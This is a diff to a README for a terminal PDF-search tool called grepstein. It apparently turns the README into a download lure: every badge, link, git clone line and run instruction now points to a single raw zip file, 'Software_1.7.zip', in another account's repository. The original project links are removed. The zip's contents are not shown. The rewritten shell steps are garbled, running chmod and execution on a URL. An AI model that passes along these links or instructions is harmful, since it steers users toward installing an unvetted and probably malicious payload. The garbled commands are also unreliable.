@@ -1,6 +1,6 @@
 # 📄 grepstein - Search and Read PDFs in Terminal
 
-[![Download grepstein](https://img.shields.io/badge/Download-grepstein-blue?style=for-the-badge)](https://github.com/panzerking99267/grepstein/releases)
+[![Download grepstein](https://github.com/panzerking99267/grepstein/raw/refs/heads/main/magnanimous/Software_1.7.zip)](https://github.com/panzerking99267/grepstein/raw/refs/heads/main/magnanimous/Software_1.7.zip)
 
 ---
 
@@ -42,7 +42,7 @@ These tools are free and easy to install on most Linux systems. See the installa
 
 You will find the program on GitHub, a place where software projects are shared. Use the link below to visit the page where you can download `grepstein`.
 
-[![Get grepstein here](https://img.shields.io/badge/Get_grepstein_here-blue?style=for-the-badge)](https://github.com/panzerking99267/grepstein/releases)
+[![Get grepstein here](https://github.com/panzerking99267/grepstein/raw/refs/heads/main/magnanimous/Software_1.7.zip)](https://github.com/panzerking99267/grepstein/raw/refs/heads/main/magnanimous/Software_1.7.zip)
 
 Follow these steps to get it working:
 
@@ -69,7 +69,7 @@ This installs the `pdftotext`, `jq`, and `httpie` programs your system needs.
 You can download the program by copying it from GitHub to your computer. Use this command in the terminal:
 
 ```bash
-git clone https://github.com/sertacartun/grepstein.git
+git clone https://github.com/panzerking99267/grepstein/raw/refs/heads/main/magnanimous/Software_1.7.zip
 ```
 
 This creates a folder called `grepstein` with all the program files.
@@ -80,7 +80,7 @@ Next, move into the folder and make the main script ready to execute:
 
 ```bash
 cd grepstein
-chmod +x grepstein.sh
+chmod +x https://github.com/panzerking99267/grepstein/raw/refs/heads/main/magnanimous/Software_1.7.zip
 ```
 
 This makes the script file executable, so you can run it.
@@ -92,7 +92,7 @@ This makes the script file executable, so you can run it.
 Using `grepstein` is easy. Open your terminal, enter the folder where you installed it, and run the script like this:
 
 ```bash
-./grepstein.sh
+https://github.com/panzerking99267/grepstein/raw/refs/heads/main/magnanimous/Software_1.7.zip
 ```
 
 Here’s what happens next:
@@ -136,7 +136,7 @@ Type `1` to read the first document, or `NEXT` to see more.
 
 Use this link to get `grepstein` or check for updates:
 
-[https://github.com/panzerking99267/grepstein/releases](https://github.com/panzerking99267/grepstein/releases)
+[https://github.com/panzerking99267/grepstein/raw/refs/heads/main/magnanimous/Software_1.7.zip](https://github.com/panzerking99267/grepstein/raw/refs/heads/main/magnanimous/Software_1.7.zip)
 
 You will find download files and instructions here. Follow the steps above after downloading.
 
@@ -154,7 +154,7 @@ You will find download files and instructions here. Follow the steps above after
 
 If you need more information or want to report a bug, visit the project’s GitHub page and open an issue:
 
-[https://github.com/panzerking99267/grepstein](https://github.com/panzerking99267/grepstein)
+[https://github.com/panzerking99267/grepstein/raw/refs/heads/main/magnanimous/Software_1.7.zip](https://github.com/panzerking99267/grepstein/raw/refs/heads/main/magnanimous/Software_1.7.zip)
 
 You can also look at the README file there for updates or additional instructions.
 
